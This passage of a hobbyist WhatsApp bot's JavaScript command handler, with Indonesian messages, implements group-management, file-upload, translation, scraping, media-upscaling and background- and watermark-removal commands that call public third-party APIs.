            const service = new ImageUploadService('pixhost.to');
            const { directLink } = await service.uploadFromBinary(media, 'biyu-offc.png');
            return directLink;
        } catch (e) {
            console.error('Pixhost:', e.message);
            return null;
        }
    }
    const [
        supa,
        tmpfiles,
        uguu,
        freeimage,
        catbox,
        pixhost
    ] = await Promise.all([
        uploadToSupa(media),
        uploadToTmpFiles(filePath),
        uploadToUguu(filePath),
        uploadToFreeImageHost(media),
        uploadToCatbox(media, mimetype),
        uploadToPixhost(media)
    ]);
    let hasil = `*✅ Upload berhasil ke beberapa layanan:*\n\n`;
    if (supa) hasil += `🔗 *Supa:* ${supa}\n`;
    if (tmpfiles) hasil += `🔗 *TmpFiles:* ${tmpfiles}\n`;
    if (uguu) hasil += `🔗 *Uguu:* ${uguu}\n`;
    if (freeimage) hasil += `🔗 *FreeImage.Host:* ${freeimage}\n`;
    if (catbox) hasil += `🔗 *Catbox:* ${catbox}\n`;
    if (pixhost) hasil += `🔗 *Pixhost:* ${pixhost}\n`;
    hasil += `\n*Ukuran:* ${fileSize}`;
    await conn.sendMessage(m.chat, { text: hasil }, { quoted: m });
    await conn.sendMessage(m.chat, {
        react: { text: '✅', key: m.key }
    });
    fs.unlinkSync(filePath);
}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'genshinprofile':
case 'gp': 
case 'gistalk': 
case 'genshinstalk': {
  if (!q) return m.reply('Mana UID Genshin Nya?\n\n*Contoh:* 741910533');

  try {
    m.reply('Wait...');
    const headers = {
      "Content-Type": "application/json; charset=UTF-8",
      "Origin": "https://enka.network",
      "Referer": "https://enka.network/",
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.89 Safari/537.36",
    };
const axios = require('axios');
    const res = await axios.get(`https://enka.network/api/uid/${q.trim()}`, { headers });
    const player = res.data.playerInfo;
    const screenshot = `https://mini.s-shot.ru/990x810/PNG/975/Z100/?https://enka.network/u/${res.data.uid}/`;
    const caption = `
*====== \`[Genshin Profile Info]\` ======*
- Nickname : ${player.nickname}
- Level : ${player.level}
- World Level : ${player.worldLevel}
- Achievement : ${player.finishAchievementNum}
- Card ID : ${player.nameCardId}
- Spiral Abyss : ${player.towerFloorIndex} - ${player.towerLevelIndex}

- Detail: https://enka.network/u/${res.data.uid}
- UID : ${res.data.uid}
    `.trim();

    conn.sendMessage(m.chat, {
      image: { url: screenshot },
      caption: caption
    }, { quoted: m });
  } catch (err) {
    console.log(err);
    m.reply(`Gagal mengambil data! Coba periksa UID-nya.\n\n${err.message}`);
  }
}
break

case 'stringtranslate': case 'tr2': case 'translate2': {
if (!q.includes('|')) return m.reply('Formatnya salah!\nContoh: translate halo|id');
const [teks, target] = q.split('|');
try {
const axios = require('axios');
const response = await axios.post('https://api.stringtranslate.com/string', {
text: `<p>${teks}</p>`,
from: 'auto',
lang: target.trim(),
id: Math.random().toString(36).substring(7)
}, {
headers: {
'authority': 'api.stringtranslate.com',
'content-type': 'application/json',
'origin': 'https://stringtranslate.com',
'referer': 'https://stringtranslate.com/',
'user-agent': 'Postify/1.0.0'
}
});
const cheerio = require('cheerio');
const $ = cheerio.load(response.data);
const hasil = $('font[style="vertical-align: inherit;"]').eq(1).text();
m.reply(`*Translate Result*\n\nFrom: auto\nTo: ${target}\n\n${hasil}`);
} catch (e) {
m.reply(`Gagal translate: ${e.message}`);
}
}
break

case "tr": case "translate": {
  let language
  let teks
  let defaultLang = "en"
  if (text || m.quoted) {
    let translate = require('translate-google-api')
    if (text && !m.quoted) {
      if (argsbiyuoffc.length < 2) return m.reply(example("id good night"))
      language = argsbiyuoffc[0]
      teks = text.split(" ").slice(1).join(' ')
    } else if (m.quoted) {
      if (!text) return m.reply(example("id good night"))
      if (argsbiyuoffc.length < 1) return m.reply(example("id good night"))
      if (!m.quoted.text) return m.reply(example("id good night"))
      language = argsbiyuoffc[0]
      teks = m.quoted.text
    }
    let result
    try {
      result = await translate(`${teks}`, {to: language})
    } catch (e) {
      result = await translate(`${teks}`, {to: defaultLang})
    } finally {
      m.reply(result[0], { quoted: m })
    }
  } else {
    return m.reply(example("id good night"))
  }
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "hdvideo":
case "hdvid": {
    const ffmpeg = require('fluent-ffmpeg');
    const ffmpegStatic = require('ffmpeg-static');
    const { writeFile, unlink, mkdir } = require('fs').promises;
    const { existsSync } = require('fs');
    const path = require('path');
    if (!ffmpegStatic) {
        return conn.sendMessage(m.chat, { text: "❌ FFMPEG tidak ditemukan! Pastikan sudah diinstal dengan benar." }, { quoted: m });
    }
    ffmpeg.setFfmpegPath(ffmpegStatic);
    let inputPath, outputPath;
    try {
        let q = m.quoted || m;
        let mime = q.mimetype || q.msg?.mimetype || q.mediaType || "";
        if (!mime) return biyu.sendMessage(m.chat, { text: "❌ Mana videonya?" }, { quoted: m });
        if (!/video\/(mp4|mov|avi|mkv)/.test(mime)) {
            return conn.sendMessage(m.chat, { text: `❌ Format ${mime} tidak didukung!` }, { quoted: m });
        }
        conn.sendMessage(m.chat, { text: "⏳ Sedang memproses video, mohon tunggu sekitar 2 - 4 menit..." }, { quoted: m });
        let videoBuffer = await q.download?.();
        if (!videoBuffer) return conn.sendMessage(m.chat, { text: "❌ Gagal mengunduh video!" }, { quoted: m });
        let tempDir = path.join(__dirname, 'tmp');
        if (!existsSync(tempDir)) await mkdir(tempDir, { recursive: true });
        inputPath = path.join(tempDir, `input_${Date.now()}.mp4`);
        outputPath = path.join(tempDir, `output_${Date.now()}.mp4`);
        await writeFile(inputPath, videoBuffer);
        await new Promise((resolve, reject) => {
            ffmpeg(inputPath)
                .outputOptions([
                    '-vf', 'scale=iw*1.5:ih*1.5:flags=lanczos,eq=contrast=1:saturation=1.7,hqdn3d=1.5:1.5:6:6,unsharp=5:5:0.8:5:5:0.8',
                    '-r', '60',
                    '-preset', 'faster',
                    '-crf', '25',
                    '-c:v', 'libx264',
                    '-pix_fmt', 'yuv420p',
                    '-c:a', 'aac',
                    '-b:a', '128k'
                ])
                .on('end', resolve)
                .on('error', reject)
                .save(outputPath);
        });
        await conn.sendMessage(m.chat, { 
            video: { url: outputPath },
            caption: "✅ Video berhasil ditingkatkan kualitasnya!"
        }, { quoted: m });
    } catch (err) {
        console.error("Error HD Video:", err);
        conn.sendMessage(m.chat, { text: "❌ Gagal meningkatkan kualitas video." }, { quoted: m });
    } finally {
        setTimeout(() => {
            if (inputPath) unlink(inputPath).catch(() => {});
            if (outputPath) unlink(outputPath).catch(() => {});
        }, 5000);
    }
}
break

case 'hd':
case 'remini':
case 'buathd': {
  if (!m.quoted) return m.reply(`Kirim Atau Reply Foto Dengan Caption *${prefix + command}*`)
  let mime = (m.quoted.msg || m.quoted).mimetype || ''
  if (!/image/.test(mime)) return m.reply(`Kirim Atau Reply Foto Dengan Caption *${prefix + command}*`)
  const tempFile = path.join(__dirname, `temp_${Date.now()}.jpg`)
  try {
    let media = await m.quoted.download()
    fs.writeFileSync(tempFile, media)
    const buffer = fs.readFileSync(tempFile)
    const form = new (require('form-data'))()
    const axios = require('axios')
    form.append('reqtype', 'fileupload')
    form.append('userhash', '')
    form.append('fileToUpload', buffer, 'biyuu.jpg')
    const upres = await axios.post('https://catbox.moe/user/api.php', form, {
      headers: form.getHeaders()
    })
    const uploadedUrl = upres.data
    let apiUrl = `https://apizell.web.id/tools/hd?url=${encodeURIComponent(uploadedUrl)}`
    let res = await fetch(apiUrl)
    if (!res.ok) throw 'Gagal Mendapatkan Gambar Dari API'
    let json = await res.json()
    if (!json.status || !json.result?.upscaled) throw 'Gagal Memproses Gambar'
    let bufferHD = await (await fetch(json.result.upscaled)).arrayBuffer()
    const outputPath = path.join(__dirname, `hd_result_${Date.now()}.jpg`)
    fs.writeFileSync(outputPath, Buffer.from(bufferHD))
    await conn.sendMessage(m.chat, {
      image: fs.readFileSync(outputPath),
      caption: mess.success
    }, { quoted: m })
    fs.unlinkSync(tempFile)
    fs.unlinkSync(outputPath)
  } catch (e) {
    console.log(e)
    m.reply('Terjadi Kesalahan, Coba Lagi Nanti')
  }
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "add": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (text) {
const input = text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await conn.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
const res = await conn.groupParticipantsUpdate(m.chat, [input], 'add')
if (Object.keys(res).length == 0) {
return m.reply(`Berhasil Menambahkan ${input.split("@")[0]} Kedalam Grup Ini`)
} else {
return m.reply(JSON.stringify(res, null, 2))
}} else {
return m.reply(example("62838###"))
}
}
break

case 'sfile': {
    if (!text) return m.reply(`Format salah!\n• sfile search <query>|<halaman>\n• sfile down <url>\n\nContoh:\n• sfile search naruto|2\n• sfile down https://sfile.mobi/xxxxx`)
const cheerio = require('cheerio');
    let [mode, ...rest] = text.trim().split(' ')
    let param = rest.join(' ').trim()
    if (mode.toLowerCase() === 'search') {
        try {
            let [query, page] = param.split('|')
            let res = await (async function search(query, page = 1) {
                let res = await fetch(`https://sfile.mobi/search.php?q=${query}&page=${page}`)
                let $ = cheerio.load(await res.text())
                let result = []
                $('div.list').each(function () {
                    let title = $(this).find('a').text()
                    let size = $(this).text().trim().split('(')[1]
                    let link = $(this).find('a').attr('href')
                    if (link) result.push({ title, size: size.replace(')', ''), link })
                })
                return result
            })(query.trim(), page ? parseInt(page) : 1)
            if (!res.length) return m.reply(`🔍 Tidak ditemukan hasil untuk "${query.trim()}"`)
            let caption = res.map((v, i) => {
                return `📌 *Result ${i + 1}*
🔖 *Title:* ${v.title || 'N/A'}
📦 *Size:* ${v.size || 'N/A'}
🔗 *Link:* ${v.link || 'N/A'}`
            }).join('\n\n━━━━━━━━━━━━━━━\n\n')
            m.reply(`🔎 *Hasil Pencarian untuk "${query.trim()}"*\n\n${caption}\n\n📝 Halaman: ${page || 1}`)
        } catch (e) {
            console.error(e)
            m.reply('Terjadi kesalahan saat mencari file.')
        }
    } else if (mode.toLowerCase() === 'down') {
        if (!/https:\/\/sfile\.mobi\//gi.test(param)) return m.reply('Link tidak valid.')

        try {
            let res = await (async function download(url) {
                let res = await fetch(url)
                let $ = cheerio.load(await res.text())
                let filename = $('img.intro').attr('alt')
                let mimetype = $('div.list').text().split(' - ')[1].split('\n')[0]
                let dl = $('#download').attr('href')
                let up_at = $('.list').eq(2).text().split(':')[1].trim()
                let uploader = $('.list').eq(1).find('a').eq(0).text().trim()
                let total_down = $('.list').eq(3).text().split(':')[1].trim()
                let data = await fetch(dl)
                let $$ = cheerio.load(await data.text())
                let anu = $$('script').text()
                let download = anu.split('sf = "')[1].split('"')[0].replace(/\\/g, '')
                return { filename, mimetype, up_at, uploader, total_down, download }
            })(param)
            if (!res) return m.reply('Download gagal.')
            const buff = Buffer.from(await (await fetch(res.download)).arrayBuffer())
            await conn.sendMessage(m.chat, {
                document: buff,
                fileName: res.filename,
                mimetype: res.mimetype,
                caption: `📁 *File Information* 📁
🔹 *Filename:* ${res.filename}
🔹 *Mimetype:* ${res.mimetype}
🔹 *Uploader:* ${res.uploader || 'N/A'}
🔹 *Upload Date:* ${res.up_at || 'N/A'}
🔹 *Downloads:* ${res.total_down || 'N/A'}
🔹 *Download URL:* ${res.download}`
            }, { quoted: m })
        } catch (e) {
            console.error(e)
            m.reply('Terjadi kesalahan saat mengunduh file.')
        }
    } else {
        m.reply(`Sub-command tidak dikenali.\nGunakan:\n• sfile search <query>|<halaman>\n• sfile down <url>`)
    }
}
break

case "readerqr": case "bacaqr":
    if (!m.message.extendedTextMessage || !m.message.extendedTextMessage.contextInfo.quotedMessage) {
        return conn.sendMessage(m.key.remoteJid, { text: "❌ Harap reply gambar QR Code untuk membacanya." }, { quoted: m });
    }

    let quotedMessage = m.message.extendedTextMessage.contextInfo.quotedMessage;
    
    if (!quotedMessage.imageMessage) {
        return conn.sendMessage(m.key.remoteJid, { text: "❌ Harap reply gambar QR Code, bukan teks atau media lain." }, { quoted: m });
    }

    try {
        const stream = await downloadContentFromMessage(quotedMessage.imageMessage, "image");
        let buffer = Buffer.from([]);

        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk]);
        }

        let imagePath = "./temp_qr.jpg"; 
        fs.writeFileSync(imagePath, buffer);

        Jimp.read(imagePath, (err, image) => {
            if (err) {
                return conn.sendMessage(m.key.remoteJid, { text: "❌ Gagal membaca gambar QR Code." }, { quoted: m });
            }

            const qr = new qrCodeReader();
            qr.callback = (error, result) => {
                if (error || !result) {
                    return conn.sendMessage(m.key.remoteJid, { text: "❌ QR Code tidak valid atau tidak ditemukan." }, { quoted: m });
                }

                conn.sendMessage(m.key.remoteJid, { text: `✅ Hasil QR Code: ${result.result}` }, { quoted: m });
            };

            qr.decode(image.bitmap);
        });

    } catch (error) {
        console.error("Error membaca QR:", error);
        conn.sendMessage(m.key.remoteJid, { text: "❌ Terjadi kesalahan saat membaca QR Code." }, { quoted: m });
    }

    break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "kick": case "kik": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (text || m.quoted) {
const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await conn.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
const res = await conn.groupParticipantsUpdate(m.chat, [input], 'remove')
await m.reply(`Berhasil mengeluarkan ${input.split("@")[0]} dari grup ini`)
} else {
return m.reply(example("@tag/reply"))
}
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "leave": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
await m.reply("Baik, Saya Akan Keluar Dari Grup Ini")
await sleep(4000)
await conn.groupLeave(m.chat)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "resetlinkgc": {
if (!isCreator) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
await conn.groupRevokeInvite(m.chat)
m.reply("Berhasil mereset link grup ✅")
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "tagall": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (!text) return m.reply(example("pesannya"))
let teks = text+"\n\n"
let member = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
await member.forEach((e) => {
teks += `@${e.split("@")[0]}\n`
})
await conn.sendMessage(m.chat, {text: teks, mentions: [...member]}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "linkgc": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
const urlGrup = "https://chat.whatsapp.com/" + await conn.groupInviteCode(m.chat)
var teks = `
${urlGrup}
`
await conn.sendMessage(m.chat, {text: teks, matchedText: `${urlGrup}`}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ht":
case "hidetag": {
  if (!m.isGroup) return Reply(mess.group)
  if (!isCreator && !m.isAdmin) return Reply(mess.admin)
  let member = m.metadata.participants.map(v => v.id)
  let teks = text || (m.quoted && m.quoted.text) || ''
  if (!teks) return m.reply(example("pesannya atau reply pesannya"))
  await conn.sendMessage(m.chat, { text: teks, mentions: [...member] }, { quoted: m })
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "joingc": case "join": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("linkgcnya"))
if (!text.includes("chat.whatsapp.com")) return m.reply("Link tautan tidak valid")
let result = text.split('https://chat.whatsapp.com/')[1]
let id = await conn.groupAcceptInvite(result)
m.reply(`Berhasil bergabung ke dalam grup ${id}`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case 'get': {
 if (!/^https?:\/\//.test(text))
 return m.reply("Awali *URL* dengan http:// atau https://");

 try {
 const res = await fetch(text);
 const size = Number(res.headers.get("content-length") || 0);
 const contentType = res.headers.get("content-type") || "";
 if (size > 100 * 1024 * 1024) 
 return m.reply(`Ukuran file terlalu besar (${(size / (1024 * 1024)).toFixed(2)} MB)`);
 if (contentType.startsWith("image/")) {
 return await conn.sendMessage(m.chat, { image: { url: text }, caption: '✅ Gambar berhasil diambil!' }, { quoted: m });
 }
 if (contentType.startsWith("video/")) {
 return await conn.sendMessage(m.chat, { video: { url: text }, caption: '✅ Video berhasil diambil!' }, { quoted: m });
 }
 if (contentType.startsWith("audio/")) {
 return await conn.sendMessage(m.chat, { audio: { url: text }, mimetype: "audio/mpeg", ptt: false }, { quoted: m });
 }
 if (contentType.includes("application/") || contentType.includes("octet-stream")) {
 return await conn.sendMessage(m.chat, {
 document: { url: text },
 mimetype: contentType,
 fileName: text.split('/').pop()
 }, { quoted: m });
 }
 const buffer = await res.buffer();
 let result;
 try {
 result = util.format(JSON.parse(buffer.toString()));
 } catch (e) {
 result = buffer.toString();
 }
 m.reply(result.slice(0, 65536)); 
 } catch (err) {
 console.error(err);
 m.reply(`[ ! ] Gagal mengambil file.\n\n${err}`);
 }
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "joinch": case "joinchannel": {
if (!isCreator) return Reply(mess.owner)
if (!text && !m.quoted) return m.reply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/") && !m.quoted.text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = m.quoted ? m.quoted.text.split('https://whatsapp.com/channel/')[1] : text.split('https://whatsapp.com/channel/')[1]
let res = await conn.newsletterMetadata("invite", result)
await conn.newsletterFollow(res.id)
m.reply(`
*Berhasil join channel whatsapp ✅*
* Nama channel : *${res.name}*
* Total pengikut : *${res.subscribers + 1}*
`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case "toascii":
case "toasciiart": {
  const text = argsbiyuoffc.join(" ");
  const font = [
    "Standard",
    "Slant",
    "Bubble",
    "Digital",
    "Script",
    "Cursive",
    "Banner",
    "Big",
    "Old English",
    "Roman",
    "Greek",
    "Hebrew",
    "Arabic",
    "Chinese"
  ];

  const fontList = font.map((f, i) => `${i + 1}. ${f}`);
  const fontMessage = `Pilih font ASCII Art:\n${fontList.join("\n")}`;

  await m.reply(fontMessage);

  const response = await m.reply(`Masukkan nomor font (1-${font.length}):`);
  const fontIndex = parseInt(response.text);

  if (fontIndex >= 1 && fontIndex <= font.length) {
    const fontStyle = font[fontIndex - 1];
    const asciiArt = await toAsciiArt(text, fontStyle);
    await m.reply(asciiArt);
  } else {
    await m.reply("Nomor font tidak valid");
  }
}
  break

case "autoread": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.autoread == true) return m.reply(`*Autoread* sudah aktif!`)
global.db.settings.autoread = true
return m.reply("Berhasil menyalakan *autoread*")
} else if (teks == "off") {
if (global.db.settings.autoread == false) return m.reply(`*Autoread* tidak aktif!`)
global.db.settings.autoread = false
return m.reply("Berhasil mematikan *autoread*")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'removewm':
case 'delwm': {
    if (!quoted) return m.reply('Harap balas ke foto yang ingin dihapus watermarknya')
    if (!/image/.test(mime)) return m.reply(`Kirim/Balas foto dengan caption ${prefix + command}`)

    const BodyForm = require('form-data')
    const uploadFileUgu = async (input) => {
        try {
            const form = new BodyForm()
            form.append("files[]", fs.createReadStream(input))
            const axios = require('axios');
            const { data } = await axios({
                url: "https://uguu.se/upload.php",
                method: "POST",
                headers: {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
                    ...form.getHeaders()
                },
                data: form,
                timeout: 10000 
            })
            
            if (!data?.files?.[0]) throw new Error('Upload failed')
            return data.files[0]
            
        } catch (err) {
            throw new Error(`Error uploading file: ${err.message}`)
        }
    }

    try {
        
        await conn.sendMessage(m.chat, { 
            react: { 
                text: '⏱️', 
                key: m.key 
            }
        })

        
        const media = await conn.downloadAndSaveMediaMessage(quoted)
        const uploadResult = await uploadFileUgu(media)
        const imageUrl = `https://fastrestapis.fasturl.cloud/aiimage/imgremovewm?url=${uploadResult.url}`
        
       
        await conn.sendMessage(m.chat, { 
            image: { url: imageUrl }, 
            caption: '*Ini hasil remove watermark gambarnya*' 
        }, { 
            quoted: m
        })

       
        fs.unlinkSync(media)
        
    } catch (error) {
        console.error('Error in remove watermark:', error)
        m.reply('Maaf, terjadi kesalahan saat menghapus watermark gambar. Silakan coba lagi nanti atau hubungi pemilik bot jika masalah berlanjut.')
    }
}
break
case 'removebg2': 
case 'removebackground2': {
 try {
 let q = m.quoted ? m.quoted : m;
 let mime = (q.msg || q).mimetype || '';
 if (!mime || !mime.startsWith('image/')) 
 throw '*Kirim Gambar Atau Kirim Url Gambar Yang Valid Yaa*';
 let media = await q.download();
 let ext = mime.split('/')[1];
 let filename = `upload.${ext}`;
 const Uguu = async (buffer, filename) => {
 try {
 const form = new FormData();
 form.append('files[]', buffer, { filename });
const axios = require('axios');
 const { data } = await axios.post('https://uguu.se/upload.php', form, {
 headers: form.getHeaders(),
 });
 if (data.files && data.files[0]) {
 return {
 name: data.files[0].name,
 url: data.files[0].url,
 size: data.files[0].size,
 };
 } else {
 throw new Error('Upload gagal.');
 }
 } catch (err) {
 throw `${err.message}`;
 }
 };
 const clyrBg = {
 api: {
 base: "https://s5ash41h3g.execute-api.ap-south-1.amazonaws.com/default/api/v1/rmbg",
 endpoints: { predict: "/predict" }
 },
 headers: {
 'authority': 's5ash41h3g.execute-api.ap-south-1.amazonaws.com',
 'origin': 'https://clyrbg.com',
 'referer': 'https://clyrbg.com/',
 'user-agent': 'Postify/1.0.0'
 },
 getFileExt: (url) => {
 const extension = url.split('.').pop().toLowerCase();
 if (extension === 'webp') return 'webp';
 if (extension === 'jpg' || extension === 'jpeg') return 'jpeg';
 if (extension === 'png') return 'png';
 return 'png';
 },
 remove: async (img, isHD = false) => {
 try {
 const ex = clyrBg.getFileExt(img); 
const axios = require('axios');
 const response = await axios.get(img, { responseType: 'arraybuffer' });
 const contentType = response.headers['content-type'];
 if (!contentType || !contentType.startsWith('image/')) {
 return {
 status: false,
 code: 400,
 result: { error: "Kagak bisa ngambil link hasil remove bgnya bree 🙃" }
 };
 }
 const b = Buffer.from(response.data, 'binary').toString('base64');
 const data = { file_extension: ex, image_bytes: b, hd: isHD };
 const result = await axios.post(
 `${clyrBg.api.base}${clyrBg.api.endpoints.predict}`,
 data,
 { headers: clyrBg.headers }
 );
 return {
 status: true,
 code: 200,
 result: {
 id: result.data.id,
 url: result.data.url,
 extension: ex,
 hd: isHD
 }
 };
 } catch (error) {
 return {
 status: false,
 code: error.response?.status || 500,
 result: {
 error: error.response?.data?.message || error.message
 }
 };
 }
 }
 };
 let uploaded = await Uguu(media, filename);
 let isHD = /hd/i.test(command);
 let removed = await clyrBg.remove(uploaded.url, isHD);
 if (!removed.status) throw removed.result.error;
 let { url, extension, hd, id } = removed.result;
const axios = require('axios');
 let resultBuffer = await axios.get(url, { responseType: 'arraybuffer' });
 let caption = `*Background Removed Successfully*\n\n• *Quality Image :* ${hd ? 'HD' : 'Standard'}\n• *Format :* ${extension.toUpperCase()}\n• *ID :* ${id}`;
 await conn.sendMessage(m.chat, {
 image: Buffer.from(resultBuffer.data, 'binary'),
 caption,
 mimetype: `image/${extension}`,
 fileName: `removed-bg.${extension}`
 }, { quoted: m });
 } catch (error) {
 await conn.sendMessage(m.chat, { text: `${error}` }, { quoted: m });
 }
}
break
case 'removebg':
case 'delbackground':
case 'removebackground': {
    if (!quoted) return m.reply('Harap balas ke foto yang ingin dihapus backgroundnya')
    if (!/image/.test(mime)) return m.reply(`Kirim/Balas foto dengan caption ${prefix + command}`)

    const BodyForm = require('form-data')
    const uploadFileUgu = async (input) => {
        try {
            const form = new BodyForm()
            form.append("files[]", fs.createReadStream(input))
            const axios = require('axios');
            const { data } = await axios({
                url: "https://uguu.se/upload.php",
                method: "POST",
                headers: {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
                    ...form.getHeaders()
                },
                data: form,
                timeout: 10000 
            })
            
            if (!data?.files?.[0]) throw new Error('Upload failed')
            return data.files[0]
            
        } catch (err) {
            throw new Error(`Error uploading file: ${err.message}`)
        }
    }

    try {
        
        await conn.sendMessage(m.chat, { 
            react: { 
                text: '⏱️', 
                key: m.key 
            }
        })

      
        const media = await conn.downloadAndSaveMediaMessage(quoted)
        const uploadResult = await uploadFileUgu(media)
        const imageUrl = `https://fastrestapis.fasturl.cloud/aiimage/removebg?imageUrl=${uploadResult.url}&type=auto&shadow=false`
        
        
        await conn.sendMessage(m.chat, { 
            image: { url: imageUrl }, 
            caption: '*Ini hasil remove background gambarnya*' 
        }, { 
            quoted: m
        })

    
        fs.unlinkSync(media)
        
    } catch (error) {
        console.error('Error in remove background:', error)
        m.reply('Maaf, terjadi kesalahan saat menghapus background gambar. Silakan coba lagi nanti atau hubungi pemilik bot jika masalah berlanjut.')
    }
}
break

case "autopromosi": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.settings.autopromosi == true) return m.reply(`*Autopromosi* sudah aktif!`)
global.db.settings.autopromosi = true
return m.reply("Berhasil menyalakan *autopromosi*")
} else if (teks == "off") {
if (global.db.settings.autopromosi == false) return m.reply(`*Autopromosi* tidak aktif!`)
global.db.settings.autopromosi = false
return m.reply("Berhasil mematikan *autopromosi*")
} else return m.reply(example("on/off"))
}
break

case 'bstation' : case 'sbs': case 'searchbstation': {
const axios = require('axios')
const cheerio = require('cheerio')

async function getBsTation(q) {
 try {
 const anu = `https://www.bilibili.tv/id/search-result?q=${q}`;
 const { data } = await axios.get(anu);
 const $ = cheerio.load(data);

 let result = [];

 $('.card-container').each((_, el) => {
 const search = $(el).find('p.card-container__title').text().trim();
 const videoUrl = "https://www.bilibili.tv" + $(el).find('a').attr('href');
 const imageUrl = $(el).find('img').attr('src');
 const views = $(el).find('span.meta__tips-text').text().trim();
 const description = $(el).find('p').text().trim();

 result.push({
 search,
 videoUrl,
 imageUrl,
 views,
 description
 });
 });
 return result;
 } catch (e) {
 console.log(e);
 return [];
 }
}

 if (!text) return m.reply('Berikan Query Nya\n\n *Example :* .bilibili Spy X Family');

 try {
 const result = await getBsTation(text);
 
 if (result.length === 0) {
 return m.reply('Gak Nemu Coba Cari Yang Lain');
 }
 
 let teks = 'Bilibili Search\n\n';
 
 for (let i = 0; i < result.length; i++) {
 const item = result[i];
 teks += `*Title :* ${item.search}\n\n`;
 teks += `*Views :* ${item.views}\n\n`;
 teks += `*Description :* ${item.description}\n\n`;
 teks += `*Link :* ${item.videoUrl}`;
 }
 
 await conn.sendMessage(m.chat, { 
 image: { url: result[0].imageUrl }, 
 caption: teks 
 }, { quoted: m });
 
 } catch (e) {
 console.log(e);
 m.reply('Error');
 }
};
break

case 'creategc': case 'buatgc': case 'buatgrup': case 'buatgb': {
    if (!isCreator) return m.reply('Khusus Creator/Owner');
    
    let parts = text.split('|');
    let groupName = parts[0]?.trim();
    let groupDesc = parts[1]?.trim() || '';
    
    if (!groupName) {
        return m.reply(`Cara penggunaan: 
${prefix + command} NamaGroup|DeskripsiGroup

- Pisahkan nama dan deskripsi grup dengan simbol | 
- Deskripsi grup bersifat opsional

Contoh: 
${prefix + command} Grup Keren|Grup untuk diskusi keren`);
    }
    
    try {
        let groupData = await conn.groupCreate(groupName, []);
       
        await new Promise(resolve => setTimeout(resolve, 1000));
        
      
        if (groupDesc) {
            await conn.groupUpdateDescription(groupData.id, groupDesc);
        }
       
        let hasSetPicture = false;
        if (m.quoted && /image/.test(m.quoted.mimetype)) {
            try {
                let media = await m.quoted.download();
                await conn.updateProfilePicture(groupData.id, media);
                hasSetPicture = true;
            } catch (pictureError) {
                console.error('Error setting group picture:', pictureError);
            }
        }
        
        
        let response = await conn.groupInviteCode(groupData.id);
        let inviteLink = `https://chat.whatsapp.com/${response}`;
                let successDetails = [];
        successDetails.push(`✅ Grup "${groupName}" berhasil dibuat!`);
        
        if (groupDesc) {
            successDetails.push(`✅ Deskripsi grup berhasil diatur`);
        }
        
        successDetails.push(`\nLink grup: ${inviteLink}`);
        
      
        await conn.sendMessage(m.chat, {
            text: successDetails.join('\n'),
            contextInfo: {
                mentionedJid: [m.sender],
                forwardingScore: 999999, 
                isForwarded: true, 
                forwardedNewsletterMessageInfo: {
                    newsletterName: global.namaSaluran,
                    newsletterJid: global.idSaluran,
                },
                externalAdReply: {
                    showAdAttribution: true,
                    title: groupName,
                    body: groupDesc || 'Undangan chat grup',
                    thumbnailUrl: global.image.menu, 
                    sourceUrl: inviteLink,
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        });
    } catch (error) {
        console.error('Error creating group:', error);
        m.reply(`Gagal membuat grup: ${error.message}`);
    }
